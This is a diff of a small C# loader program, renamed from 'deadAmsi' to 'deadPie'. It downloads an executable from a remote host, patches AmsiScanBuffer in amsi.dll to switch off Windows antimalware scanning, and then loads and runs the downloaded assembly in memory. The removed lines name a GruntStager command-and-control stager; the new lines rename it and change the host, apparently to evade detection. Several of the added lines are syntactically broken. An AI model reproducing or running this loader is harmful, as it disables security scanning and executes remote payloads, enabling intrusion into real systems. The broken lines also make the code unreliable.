@@ -3,27 +3,27 @@ using System.Net;
 using System.Reflection;
 using System.Runtime.InteropServices;
 
-namespace deadAmsi
+namespace deadPie
 {
     class Program
     {
         static void Main(string[] args)
         {
             var client = new WebClient();
-            var gruntStager = client.DownloadData("http://10.8.0.178/dead.exe");
+            var deadGet = client.DownloadData("http://10.0.0.0/picnic.exe");
             client.Dispose();
 
-            var amsiDll = LoadLibrary("amsi.dll");
-            var asbAddress = GetProcAddress(amsiDll, "AmsiScanBuffer");
-            var ret = new byte[] { 0xC3 };
-            VirtualProtect(asbAddress, (UIntPtr)ret.Length, 0x40, out uint oldProtect);
-            Marshal.Copy(ret, 0, asbAddress, ret.Length);
-            VirtualProtect(asbAddress, (UIntPtr)ret.Length, oldProtect, out uint _);
+            var deadDll = LoadLibrary("amsi.dll");
+            var deadFind = GetProcAddress(deadDll, "AmsiScanBuffer");
+            var deadReturn = new byte[] { 0xC3 };
+            VirtualProtect(deadFind, (UIntPtr deadReturn.Length, 0x40, out uint oldProtect);
+            Marshal.Copy deadReturn, 0, deadFind, deadReturn.Length);
+            VirtualProtect(deadFind, (UIntPtr deadReturn.Length, oldProtect, out uint _);
 
-            var asm = Assembly.Load(gruntStager);
-            var type = asm.GetType("GruntStager.GruntStager");
+            var asm = Assembly.Load(deadGet);
+            var type = asm.GetType("deadGet.deadGet");
             var instance = Activator.CreateInstance(type);
-            type.InvokeMember("GruntStager", BindingFlags.InvokeMethod | BindingFlags.Public | BindingFlags.Static, null, instance, null);
+            type.InvokeMember("deadGet", BindingFlags.InvokeMethod | BindingFlags.Public | BindingFlags.Static, null, instance, null);
 
         }
 
